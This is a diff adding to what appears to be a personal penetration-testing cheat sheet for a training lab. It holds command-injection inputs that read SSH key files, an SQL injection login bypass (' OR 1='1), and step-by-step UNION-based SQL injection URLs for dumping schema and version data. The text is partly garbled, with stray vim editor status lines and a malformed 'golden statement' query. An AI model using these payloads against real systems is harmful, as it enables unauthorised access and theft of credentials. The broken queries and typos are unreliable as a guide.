@@ -47,5 +47,30 @@ cat $HOME/.ssh/id_rsa.pub
 ; cat /var/www/.ssh/authorized_keys
 
 #SQL 
-## Login screen? AUTHENTICATION BYPASS (F12)
-W10: Warning: Changing a readonly file                                                                                                                                                      1,40          Top
+## Login screen? AUTHENTICATION BYPASS (F12)                                                                                                                                                      1,40          Top
+ username: ' OR 1='1
+ password: ' OR 1='1
+ 
+ Go to inspect > Network > Post > Request > Raw (radiobutton)
+ add a "?" copy paste back into url
+ Example .x.x.x/login.php?<paste>
+ 
+ ##SQL GET Method
+ 1. Find vulnerable field
+ http://10.50.32.39/uniondemo.php?Selection=2 or 1=1
+ 
+ 2. Identify Number of Columns
+ http://10.50.32.39/uniondemo.php?Selection=2 UNION SELECT 1,2,3
+ 
+ 3. Use Golden Statement
+ http://10.50.32.39/uniondemo.php?Selection=2 UNION SELECT 1,2,3 table_schema,column_name,table_name f    rom information_schema.columns
+ 
+ 4. Craft queries
+ UNION SELECT <column>,<column>,<column> FROM <database>,<table>
+ 
+ ### Get version
+ x.x.x.x/Selection=2 UNION SELECT 1,2,@@version
+  
+ ## Find a funtion
+ scp program over to linops > gdp <filename> > pdisass main #look for functions inside <>, or colored     in red.
+ 
